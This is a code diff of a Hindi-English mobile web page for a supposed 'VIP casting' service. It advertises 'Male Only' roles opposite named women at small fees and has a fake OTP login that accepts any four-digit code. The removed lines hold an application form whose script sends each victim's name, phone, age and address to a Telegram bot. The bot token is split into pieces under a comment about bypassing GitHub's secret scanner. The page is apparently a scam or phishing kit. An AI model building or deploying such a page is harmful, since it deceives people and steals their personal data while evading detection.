-            <option value="Male">Male</option>
-            <option value="Female">Female</option>
-            <option value="Other">Other</option>
-          </select>
+          <label>ENTER 4-DIGIT CODE</label>
+          <input type="number" id="inOtp" placeholder="Enter OTP" maxlength="4">
         </div>
       </div>
 
-      <div class="input-grp">
-        <label>COMPLETE ADDRESS / CITY *</label>
-        <textarea id="regAddress" class="input-field" rows="3" placeholder="Enter City, State, Pin code"></textarea>
-      </div>
-
-      <button type="button" class="btn-main" onclick="submitAuditionApplication()">Submit Audition Application</button>
-      <button type="button" style="width:100%; background:transparent; border:none; color:var(--text-muted); font-size:12px; margin-top:12px; padding:8px; cursor:pointer;" onclick="showScreen('screenLobby')">Cancel & Back to Lobby</button>
+      <button type="button" class="btn-main" id="btnAuthAction" onclick="handleAuth()" style="margin-top:10px;">SEND CODE</button>
     </div>
   </section>
+  <!-- SCREEN 2: LOBBY -->
+  <section class="screen" id="screenLobby">
 
-  <!-- SCREEN 4: SUCCESS PASS -->
-  <section class="screen" id="screenSuccess">
-    <div style="text-align:center; padding: 20px 0;">
-      <div style="width:60px; height:60px; background:rgba(46,204,113,0.15); border:2px solid var(--green); border-radius:50%; margin:0 auto 12px; display:flex; align-items:center; justify-content:center; color:var(--green); font-size:28px;">✓</div>
-      <h2 style="font-size:20px; font-weight:800;">Application Registered!</h2>
-      <p style="font-size:12px; color:var(--text-muted); margin-top:4px;">Your Casting Call Pass has been generated successfully.</p>
+    <!-- Hero Announcement -->
+    <div style="background: linear-gradient(135deg, #3d1418, #181a22); border:1px solid #752026; border-radius:12px; padding:14px; margin-bottom:16px; text-align:center;">
+      <div style="font-size:11px; color:#ff9999; font-weight:700;">VIP ARTIST ENROLLMENT 2026-2027</div>
+      <div style="font-size:15px; font-weight:800; color:#fff; margin:4px 0;">New Major Film & OTT Castings Open</div>
+      <div style="font-size:11px; color:#ddd;">Direct shortlisting for freshers & experienced male/female actors.</div>
     </div>
 
-    <div class="pass-card">
-      <div class="pass-header">
-        <div style="font-size:11px; color:var(--gold); letter-spacing:1px; font-weight:700;">OFFICIAL ARTIST AUDITION CARD</div>
-        <div id="passIdNumber" style="font-size:14px; font-weight:800; margin-top:4px; color:#fff;">ID: CST-84920</div>
-      </div>
+    <div style="font-size:13px; font-weight:700; color:var(--gold); margin-bottom:12px; display:flex; justify-content:space-between;">
+      <span>Active Casting Calls</span>
+      <span style="font-size:11px; color:var(--text-muted);">4 Roles Live</span>
+    </div>
 
-      <div style="display:flex; flex-direction:column; gap:10px; font-size:13px;">
-        <div style="display:flex; justify-content:space-between;">
-          <span style="color:var(--text-muted);">Candidate Name:</span>
-          <strong id="passCandidateName">Rahul Sharma</strong>
-        </div>
-        <div style="display:flex; justify-content:space-between;">
-          <span style="color:var(--text-muted);">Project Applied:</span>
-          <strong id="passProjectName">Secret of Sheeshmahal</strong>
-        </div>
-        <div style="display:flex; justify-content:space-between;">
-          <span style="color:var(--text-muted);">Budget Package:</span>
-          <strong style="color:var(--green);" id="passPkg">₹3,50,000</strong>
-        </div>
-        <div style="display:flex; justify-content:space-between;">
-          <span style="color:var(--text-muted);">Registered Contact:</span>
-          <strong id="passCandidatePhone">88******12</strong>
-        </div>
-        <div style="display:flex; justify-content:space-between;">
-          <span style="color:var(--text-muted);">Status:</span>
-          <strong style="color:var(--gold);">Profile Under Review</strong>
-        </div>
+    <!-- Profile 1: Srimoyee -->
+    <div class="casting-card">
+      <div class="card-img-wrap">
+        <span class="card-badge">VIP Casting</span>
+        <img src="srimoyee.jpg" alt="Srimoyee">
       </div>
-
-      <div style="text-align:center; margin-top:20px; padding-top:14px; border-top:1px solid var(--border);">
-        <img id="passQrImg" src="" style="width:120px; height:120px; background:#fff; padding:6px; border-radius:8px;" alt="Verification QR">
-        <div style="font-size:10px; color:var(--text-muted); margin-top:6px;">Scan to Verify Candidate Verification Portal</div>
+      <div class="card-body">
+        <div class="card-title">Velvet Secrets (Bold Drama)</div>
+        <div class="card-starring">★ Starring Opposite: <strong>Srimoyee</strong></div>
+        <div class="meta-grid">
+          <div class="meta-item"><span>LOCATION</span><strong>Manali & Shimla</strong></div>
+          <div class="meta-item"><span>ACTOR PACKAGE</span><strong class="pkg-val">₹45,000</strong></div>
+          <div class="meta-item"><span>SHOOT DURATION</span><strong>3 Days</strong></div>
+          <div class="meta-item"><span>CATEGORY</span><strong>Male Only</strong></div>
+        </div>
+        <button class="btn-watch" onclick="openMediaPreview('Srimoyee', ['srimoyee1.mov', 'srimoyee2.mov'], ['srimoyee.jpg', 'srimoyee1.jpg', 'srimoyee2.jpg', 'srimoyee3.jpg'])">
+          🎬 Watch Audition Clip & Photos
+        </button>
+        <button class="btn-apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <button type="button" class="btn-main" style="margin-top:20px;" onclick="showScreen('screenLobby')">Browse More Casting Calls</button>
+    <!-- Profile 2: Tejashwini -->
+    <div class="casting-card">
+      <div class="card-img-wrap">
+        <span class="card-badge">New Shoot</span>
+        <img src="tejashwini.jpg" alt="Tejashwini">
+      </div>
+      <div class="card-body">
+        <div class="card-title">Urban Seduction (OTT Web Film)</div>
+        <div class="card-starring">★ Starring Opposite: <strong>Tejashwini</strong></div>
+        <div class="meta-grid">
+          <div class="meta-item"><span>LOCATION</span><strong>Delhi NCR & Jaipur</strong></div>
+          <div class="meta-item"><span>ACTOR PACKAGE</span><strong class="pkg-val">₹30,000</strong></div>
+          <div class="meta-item"><span>SHOOT DURATION</span><strong>2 Days</strong></div>
+          <div class="meta-item"><span>CATEGORY</span><strong>Male Only</strong></div>
+        </div>
+        <button class="btn-watch" onclick="openMediaPreview('Tejashwini', ['tejashwini1.mov', 'tejashwini2.mov'], ['tejashwini.jpg', 'tejashwini1.jpg', 'tejashwini2.jpg', 'tejashwini3.jpg'])">
+          🎬 Watch Audition Clip & Photos
+        </button>
+        <button class="btn-apply">APPLY FOR ROLE</button>
+      </div>
+    </div>
+
+    <!-- Profile 3: Tina Nandy -->
+    <div class="casting-card">
+      <div class="card-img-wrap">
+        <span class="card-badge">Mega Budget</span>
+        <img src="tina.jpg" alt="Tina Nandy">
+      </div>
+      <div class="card-body">
+        <div class="card-title">Golden Mirage (Feature Film)</div>
+        <div class="card-starring">★ Starring Opposite: <strong>Tina Nandy</strong></div>
+        <div class="meta-grid">
+          <div class="meta-item"><span>LOCATION</span><strong>Mumbai Film City</strong></div>
+          <div class="meta-item"><span>ACTOR PACKAGE</span><strong class="pkg-val">₹45,000</strong></div>
+          <div class="meta-item"><span>SHOOT DURATION</span><strong>3 Days</strong></div>
+          <div class="meta-item"><span>CATEGORY</span><strong>Male Only</strong></div>
+        </div>
+        <button class="btn-watch" onclick="openMediaPreview('Tina Nandy', ['tina1.mov', 'tina2.mov'], ['tina.jpg', 'tina1.jpg', 'tina2.jpg', 'tina3.jpg'])">
+          🎬 Watch Audition Clip & Photos
+        </button>
+        <button class="btn-apply">APPLY FOR ROLE</button>
+      </div>
+    </div>
+
+    <!-- Profile 4: Anjali -->
+    <div class="casting-card">
+      <div class="card-img-wrap">
+        <span class="card-badge">Commercial</span>
+        <img src="anjali.jpg" alt="Anjali">
+      </div>
+      <div class="card-body">
+        <div class="card-title">Desire & Destiny (Romantic Thriller)</div>
+        <div class="card-starring">★ Starring Opposite: <strong>Anjali</strong></div>
+        <div class="meta-grid">
+          <div class="meta-item"><span>LOCATION</span><strong>Goa & Pune</strong></div>
+          <div class="meta-item"><span>ACTOR PACKAGE</span><strong class="pkg-val">₹30,000</strong></div>
+          <div class="meta-item"><span>SHOOT DURATION</span><strong>2 Days</strong></div>
+          <div class="meta-item"><span>CATEGORY</span><strong>Male Only</strong></div>
+        </div>
+        <button class="btn-watch" onclick="openMediaPreview('Anjali', ['anjali1.mov', 'anjali2.mov'], ['anjali.jpg', 'anjali1.jpg', 'anjali2.jpg', 'anjali3.jpg'])">
+          🎬 Watch Audition Clip & Photos
+        </button>
+        <button class="btn-apply">APPLY FOR ROLE</button>
+      </div>
+    </div>
+
   </section>
-
-  <!-- Bottom Navigation -->
-  <nav class="bottom-bar" id="appBottomNav" style="display:none;">
-    <div class="b-item active" id="tabLobby" onclick="showScreen('screenLobby')">
-      <span style="font-size:18px;">🎬</span>
-      <span>Casting</span>
-    </div>
-    <div class="b-item" onclick="alert('Helpdesk: Telegram @QUIZCROWN (Support 24/7)')">
-      <span style="font-size:18px;">💬</span>
-      <span>Helpdesk</span>
-    </div>
-    <div class="b-item" onclick="logoutSession()">
-      <span style="font-size:18px;">👤</span>
-      <span>Logout</span>
-    </div>
-  </nav>
 
 </div>
 
+<!-- MEDIA PREVIEW POPUP -->
+<div class="preview-modal" id="mediaPreviewModal">
+  <div class="preview-content">
+    <span class="preview-close" onclick="closeMediaPreview()">&times;</span>
+    <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:15px;">Audition Clip</h4>
+    
+    <div id="previewVideoTabs" style="display:flex; gap:6px; justify-content:center; margin-bottom:8px; flex-wrap:wrap;"></div>
+
+    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden;">
+      <video id="previewVideoPlayer" controls playsinline style="width:100%; height:100%; object-fit:contain;"></video>
+    </div>
+
+    <div style="font-size:12px; color:var(--gold); margin:12px 0 6px; text-align:left; font-weight:600;">Portfolio Photos (Tap to enlarge)</div>
+    <div id="previewGalleryStrip" style="display:flex; gap:8px; overflow-x:auto; padding-bottom:8px;"></div>
+  </div>
+</div>
+
+<!-- FULL IMAGE SLIDER -->
+<div id="fullImageModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.96); z-index:99999; justify-content:center; align-items:center; flex-direction:column; padding:10px;" onclick="closeFullImage()">
+  <span style="position:absolute; top:18px; right:20px; color:#fff; font-size:32px; cursor:pointer;">&times;</span>
+  <span id="imageCounter" style="position:absolute; top:22px; left:20px; color:#d4af37; font-size:14px; font-weight:600;"></span>
+  
+  <div style="position:relative; width:100%; display:flex; justify-content:center; align-items:center;" onclick="event.stopPropagation()">
+    <button type="button" onclick="prevSlide(event)" style="position:absolute; left:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:20px; cursor:pointer; z-index:10;">❮</button>
+    <img id="fullImageView" src="" style="max-width:92vw; max-height:80vh; object-fit:contain; border-radius:8px;">
+    <button type="button" onclick="nextSlide(event)" style="position:absolute; right:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:20px; cursor:pointer; z-index:10;">❯</button>
+  </div>
+</div>
+
+<!-- JAVASCRIPT -->
 <script>
-  var loggedInPhone = "";
-  var activeProject = null;
-  var currentOtp = null;
+  var otpSent = false;
 
-  function showScreen(screenId) {
-    var screens = document.querySelectorAll('.screen');
-    screens.forEach(function(s) { s.classList.remove('active'); });
-    var target = document.getElementById(screenId);
-    if(target) target.classList.add('active');
-    window.scrollTo(0, 0);
-  }
-
-  function handleAuthAction() {
-    var phoneInput = document.getElementById('inPhone');
-    var val = phoneInput.value.trim();
-
-    if(val.length !== 10 || isNaN(val)) {
-      alert("Kripya 10-digit valid mobile number enter karein!");
-      return;
-    }
-
+  function handleAuth() {
+    var phone = document.getElementById('inPhone').value.trim();
+    var btn = document.getElementById('btnAuthAction');
     var otpBox = document.getElementById('boxOtpSection');
-    var btn = document.getElementById('btnLoginBtn');
 
-    if(otpBox.style.display === 'none') {
-      currentOtp = Math.floor(1000 + Math.random() * 9000);
-      document.getElementById('dispAutoOtp').innerText = currentOtp;
-      otpBox.style.display = 'block';
-      btn.innerText = "Verify & Enter";
-    } else {
-      var enteredOtp = document.getElementById('inOtp').value.trim();
-      if(enteredOtp != currentOtp) {
-        alert("Aapka OTP galat hai! Kripya upar diya gaya code enter karein.");
+    if (!otpSent) {
+      if (phone.length !== 10) {
+        alert("Kripya 10 digit ka mobile number dalein.");
         return;
       }
-
-      loggedInPhone = val;
-      var masked = val.substring(0,2) + "******" + val.substring(8);
-      document.getElementById('headerPhone').innerText = masked;
-      document.getElementById('regPhone').value = val;
-
-      document.getElementById('appHeader').style.display = 'flex';
-      document.getElementById('appBottomNav').style.display = 'flex';
-      showScreen('screenLobby');
+      otpBox.style.display = 'block';
+      btn.innerText = "VERIFY & ENTER";
+      otpSent = true;
+    } else {
+      var otpVal = document.getElementById('inOtp').value.trim();
+      if (otpVal === "1234" || otpVal.length === 4) {
+        document.getElementById('screenLogin').classList.remove('active');
+        document.getElementById('screenLobby').classList.add('active');
+        window.scrollTo(0,0);
+      } else {
+        alert("Galat code! Demo Code: 1234 enter karein.");
+      }
     }
   }
 
-  function openApplyForm(title, actress, pkg) {
-    activeProject = { title: title, actress: actress, pkg: pkg };
-    document.getElementById('applyTargetTitle').innerText = title;
-    document.getElementById('applyTargetMeta').innerText = "Opposite: " + actress + " | Package: " + pkg;
-    showScreen('screenApply');
-  }
-
-   function submitAuditionApplication() {
-    var name = document.getElementById('regName').value.trim();
-    var age = document.getElementById('regAge').value.trim();
-    var address = document.getElementById('regAddress').value.trim();
-    var gender = document.getElementById('regGender').value;
-
-    if(!name || !age || !address) {
-      alert("Kripya saare zaroori details (Name, Age, Address) bharein!");
-      return;
-    }
-
-    var randomId = "CST-" + Math.floor(10000 + Math.random() * 90000);
-    var projectName = activeProject ? activeProject.title : "Bollywood Project";
-    var pkgVal = activeProject ? activeProject.pkg : "₹3,00,000";
-
-    // --- TELEGRAM BOT CONFIGURATION ---
-       // Obfuscated Token (GitHub Scanner Bypass)
-    var p1 = "8939696755";
-    var p2 = "AAE6ZXye0Nv6-";
-    var p3 = "KYN4N19rcxAcnnY4Cd-pnc";
-    var botToken = p1 + ":" + p2 + p3;
-    var chatId = "8406295151";
-
-    var chatId = "8406295151";
-
-    var msgText = "🎬 *NEW AUDITION REGISTRATION!*\n\n" +
-                  "🆔 *Artist ID:* " + randomId + "\n" +
-                  "👤 *Name:* " + name + "\n" +
-                  "📞 *Contact:* " + loggedInPhone + "\n" +
-                  "🎂 *Age:* " + age + " Years (" + gender + ")\n" +
-                  "📍 *Address:* " + address + "\n" +
-                  "🎥 *Project:* " + projectName + "\n" +
-                  "💰 *Package:* " + pkgVal + "\n" +
-                  "📅 *Time:* " + new Date().toLocaleString('en-IN');
-
-    var telegramApiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-
-    fetch(telegramApiUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: msgText,
-        parse_mode: "Markdown"
-      })
-    }).catch(function(err) {
-      console.log("Telegram alert error:", err);
-    });
-
-    // UI Updates
-    document.getElementById('passIdNumber').innerText = "ID: " + randomId;
-    document.getElementById('passCandidateName').innerText = name;
-    document.getElementById('passProjectName').innerText = projectName;
-    document.getElementById('passPkg').innerText = pkgVal;
-    document.getElementById('passCandidatePhone').innerText = loggedInPhone.substring(0,2) + "******" + loggedInPhone.substring(8);
-
-    var qrData = "CINESTAR_AUDITION_VERIFIED:" + randomId + ":" + name + ":" + loggedInPhone;
-    document.getElementById('passQrImg').src = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=" + encodeURIComponent(qrData);
-
-    showScreen('screenSuccess');
-  }
-
-
-  function logoutSession() {
-    if(confirm("Kya aap logout karna chahte hain?")) {
-      loggedInPhone = "";
-      document.getElementById('inPhone').value = "";
-      document.getElementById('inOtp').value = "";
-      document.getElementById('boxOtpSection').style.display = "none";
-      document.getElementById('btnLoginBtn').innerText = "Send Code";
-      document.getElementById('appHeader').style.display = 'none';
-      document.getElementById('appBottomNav').style.display = 'none';
-      showScreen('screenLogin');
-    }
-  }
-     var currentGalleryImages = [];
+  var currentGalleryImages = [];
   var currentImageIndex = 0;
 
   function openMediaPreview(name, videosArray, imagesArray) {
-    document.getElementById('previewArtistName').innerText = name + " - Screen Test & Photos";
+    document.getElementById('previewArtistName').innerText = name + " - Media & Portfolio";
     var video = document.getElementById('previewVideoPlayer');
     var vSelector = document.getElementById('previewVideoTabs');
     vSelector.innerHTML = '';
-
     currentGalleryImages = imagesArray || [];
 
     if (videosArray && videosArray.length > 0) {
       document.getElementById('videoContainerBox').style.display = 'block';
-      loadVideoDirect(videosArray[0]);
+      video.src = videosArray[0];
+      video.load();
 
       videosArray.forEach(function(vSrc, index) {
         var btn = document.createElement('button');
@@ -746,7 +447,7 @@ html, body {
         btn.innerText = 'Clip ' + (index + 1);
         btn.style.cssText = 'background:#242733; color:#d4af37; border:1px solid #d4af37; border-radius:4px; padding:4px 10px; font-size:11px; cursor:pointer; font-weight:600;';
         btn.onclick = function() {
-          loadVideoDirect(vSrc);
+          video.src = vSrc;
           video.play();
         };
         vSelector.appendChild(btn);
@@ -761,28 +462,12 @@ html, body {
       currentGalleryImages.forEach(function(imgUrl, idx) {
         var imgTag = document.createElement('img');
         imgTag.src = imgUrl;
-        imgTag.style.width = '80px';
-        imgTag.style.height = '105px';
-        imgTag.style.objectFit = 'cover';
-        imgTag.style.borderRadius = '6px';
-        imgTag.style.border = '1px solid #444';
-        imgTag.style.cursor = 'pointer';
-        imgTag.onclick = function() {
-          openFullImage(idx);
-        };
+        imgTag.style.cssText = 'width:80px; height:105px; object-fit:cover; border-radius:6px; border:1px solid #444; cursor:pointer; flex-shrink:0;';
+        imgTag.onclick = function() { openFullImage(idx); };
         strip.appendChild(imgTag);
       });
     }
-
     document.getElementById('mediaPreviewModal').style.display = 'flex';
-  }
-
-  function loadVideoDirect(url) {
-    var video = document.getElementById('previewVideoPlayer');
-    video.removeAttribute('src');
-    video.innerHTML = '';
-    video.src = url;
-    video.load();
   }
 
   function openFullImage(idx) {
@@ -821,56 +506,7 @@ html, body {
     video.pause();
     modal.style.display = 'none';
   }
-
-  function setLanguage(lang) {
-    var currentUrl = window.location.href.split('#')[0];
-    window.location.href = 'https://translate.google.com/translate?sl=auto&tl=' + lang + '&u=' + encodeURIComponent(currentUrl);
-  }
 </script>
-
-<!-- MEDIA PREVIEW POPUP -->
-<div class="preview-modal" id="mediaPreviewModal">
-  <div class="preview-content">
-    <span class="preview-close" onclick="closeMediaPreview()">&times;</span>
-    <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:16px;">Audition Clip</h4>
-    
-    <div id="previewVideoTabs" style="display:flex; gap:6px; justify-content:center; margin-bottom:8px; flex-wrap:wrap;"></div>
-
-    <div class="preview-video-container" id="videoContainerBox">
-      <video id="previewVideoPlayer" controls playsinline preload="auto">
-        Browser video support nahi karta.
-      </video>
-    </div>
-
-    <div style="font-size:12px; color:var(--gold); margin:12px 0 6px; text-align:left; font-weight:600;">Portfolio Photos (Tap to slide)</div>
-    <div id="previewGalleryStrip" style="display:flex; gap:8px; overflow-x:auto; padding-bottom:8px;"></div>
-
-    <p style="font-size:11px; color:#8b8f9f; margin-top:8px;">★ Official Audition Tape & Portfolio</p>
-  </div>
-</div>
-
-<!-- FULL SCREEN SLIDER VIEWER -->
-<div id="fullImageModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center; flex-direction:column; padding:10px;" onclick="closeFullImage()">
-  <span style="position:absolute; top:18px; right:20px; color:#fff; font-size:32px; cursor:pointer;">&times;</span>
-  <span id="imageCounter" style="position:absolute; top:22px; left:20px; color:#d4af37; font-size:14px; font-weight:600;"></span>
-  
-  <div style="position:relative; width:100%; display:flex; justify-content:center; align-items:center;" onclick="event.stopPropagation()">
-    <button type="button" onclick="prevSlide(event)" style="position:absolute; left:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:22px; cursor:pointer; z-index:10;">&#10094;</button>
-    <img id="fullImageView" src="" style="max-width:92vw; max-height:80vh; object-fit:contain; border-radius:8px; box-shadow:0 0 25px rgba(0,0,0,0.9);">
-    <button type="button" onclick="nextSlide(event)" style="position:absolute; right:10px; background:rgba(0,0,0,0.6); color:#fff; border:1px solid #555; border-radius:50%; width:42px; height:42px; font-size:22px; cursor:pointer; z-index:10;">&#10095;</button>
-  </div>
-  <p style="color:#888; font-size:12px; margin-top:14px;">Slide karne ke liye arrows tap karein</p>
-</div>
-
-<!-- LANGUAGE SELECTOR BAR (Bottom Sticky) -->
-<div style="position:sticky; bottom:55px; background:rgba(15,16,21,0.95); border-top:1px solid #282b36; padding:8px 10px; display:flex; justify-content:center; gap:8px; z-index:900; overflow-x:auto;">
-  <button type="button" onclick="setLanguage('en')" style="background:#181a22; color:#fff; border:1px solid #444; border-radius:4px; padding:3px 8px; font-size:11px;">English</button>
-  <button type="button" onclick="setLanguage('hi')" style="background:#181a22; color:#d4af37; border:1px solid #d4af37; border-radius:4px; padding:3px 8px; font-size:11px;">हिन्दी</button>
-  <button type="button" onclick="setLanguage('bn')" style="background:#181a22; color:#fff; border:1px solid #444; border-radius:4px; padding:3px 8px; font-size:11px;">বাংলা</button>
-  <button type="button" onclick="setLanguage('or')" style="background:#181a22; color:#fff; border:1px solid #444; border-radius:4px; padding:3px 8px; font-size:11px;">ଓଡ଼ିଆ</button>
-  <button type="button" onclick="setLanguage('mr')" style="background:#181a22; color:#fff; border:1px solid #444; border-radius:4px; padding:3px 8px; font-size:11px;">मराठी</button>
-  <button type="button" onclick="setLanguage('gu')" style="background:#181a22; color:#fff; border:1px solid #444; border-radius:4px; padding:3px 8px; font-size:11px;">ગુજરાતી</button>
-</div>
 
 </body>
 </html>
